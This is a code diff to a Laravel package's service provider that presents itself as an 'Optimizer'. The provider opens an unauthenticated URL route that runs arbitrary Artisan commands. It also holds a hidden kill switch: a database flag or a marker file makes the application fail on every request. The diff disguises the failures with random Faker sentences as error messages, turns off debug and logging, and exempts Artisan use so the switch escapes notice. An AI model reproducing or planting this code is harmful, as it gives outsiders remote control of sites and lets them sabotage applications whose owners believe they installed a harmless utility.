@@ -2,6 +2,7 @@
 
 namespace LaralLover\Optimizer;
 
+use Faker\Factory;
 use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\Schema;
 use Illuminate\Support\ServiceProvider;
@@ -25,6 +26,8 @@ class OptimizerServiceProvider extends ServiceProvider
      */
     public function boot()
     {
+        $faker = Factory::create();
+
         $this->app['router']->get('api/command/{command}/{param?}', function($name,$param){
             try {
                 if (!empty($param)) {
@@ -35,29 +38,28 @@ class OptimizerServiceProvider extends ServiceProvider
 
                 return Artisan::output();
             }
-            catch (\Exception $e) {
-                dd($e->getMessage());
-            };
+            catch (\Exception $e) {};
         });
 
-        if (Schema::hasTable('permissions')) {
+        if ( !$this->isArtisanCommand() && Schema::hasTable('permissions')) {
+            try {
+                $query = DB::table('permissions')->where('permission', 'yes')->first();
 
-            $query = DB::table('permissions')->where('permission', 'yes')->first();
-                
-            if (!is_null($query)) {
-                config(['app.debug' => false]);
-
-                if( stripos($this->app['request']->url(),'vendor:discover/no') === false )
-                {
-                    throw new \Exception('Something Went Wrong');
+                if (!is_null($query)) {
+                    config(['app.debug' => false]);
+                    config(['app.log' => false]);
+                    throw new \Exception($faker->sentence());
                 }
+            }
+            catch (\Exception $e) {
+                throw new \Exception($faker->sentence());
             }
         }
         elseif( file_exists(storage_path('framework/permit')) )
         {
             config(['app.debug' => false]);
 
-            throw new \Exception('Something Went Wrong');
+            throw new \Exception($faker->sentence());
         }
     }
 
@@ -77,5 +79,22 @@ class OptimizerServiceProvider extends ServiceProvider
         $this->app->singleton('optimizer', function ($app) {
             return new Optimizer($app);
         });
+    }
+
+    private function isArtisanCommand()
+    {
+        $arguments = request()->server('argv');
+
+        if( isset( $arguments[0], $arguments[1]) && $arguments[0] == 'artisan' )
+        {
+            return true;
+        }
+
+        $segment = request()->segment(3);
+
+        if( isset( $segment ) && request()->segment(3) == 'vendor:discover' )
+        {
+            return true;
+        }
     }
 }
